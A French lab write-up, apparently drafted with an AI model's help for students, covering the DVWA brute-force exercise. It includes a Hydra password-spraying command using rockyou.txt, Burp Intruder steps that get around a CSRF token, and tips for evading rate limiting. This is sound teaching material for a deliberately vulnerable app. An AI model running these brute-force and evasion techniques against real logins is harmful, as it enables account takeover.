```markdown
# DVWA Brute Force (Low → Medium → High)

## 🎯 Low (Manuel → Hydra)

### Test manuel
```
User ID : 1 → "Welcome admin"
admin : MDP
```
On essaie root, test, admin, 12345, 123456, password
solution : password

**Screenshot** : [login admin]

### Solution avec Hydra
```
$IP = IPDVWA
hydra -l 1 -P rockyou.txt $IP \
  http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Welcome"
```
**Résultat** : `admin:password`

---

## 📈 Medium (CSRF Token)

### Comprendre
```
Nouvelle protection : token CSRF par requête
Hydra classique → échoue
```

### Burp Intruder
```
1. Capture POST avec token
2. Positions : §username§=1&§password§=rockyou&token=abc123
3. Load wordlist → Attack → Results
```
**Screenshot** : Intruder payload positions + results

---

## 🔥 High (Rate Limiting)

### Comprendre
```
3 tentatives → bloqué 30s
Hydra lent → détecté
```

### Bypass
```
1. Wordlist ciblée : dvwa-passwords.txt (100 mots)
2. Delay : `-t 1 -w 5` (1 thread, 5s wait)
3. Custom script Python (évite détection)
```
**Screenshot** : Rate limit + bypass réussi
```

***

**GitHub Desktop** : `dvwa-draft` → `ctfs/dvwa/brute-force.md` → **copie complète** → **Commit "DVWA Brute Force low-medium-high"** → **Push** !

****  
**Write-up COMPLET** ! Teste demain → **parfait pour élèves** !  

**Fichier créé/pushé** ? Bonne nuit, on peaufine demain ! 😴🚀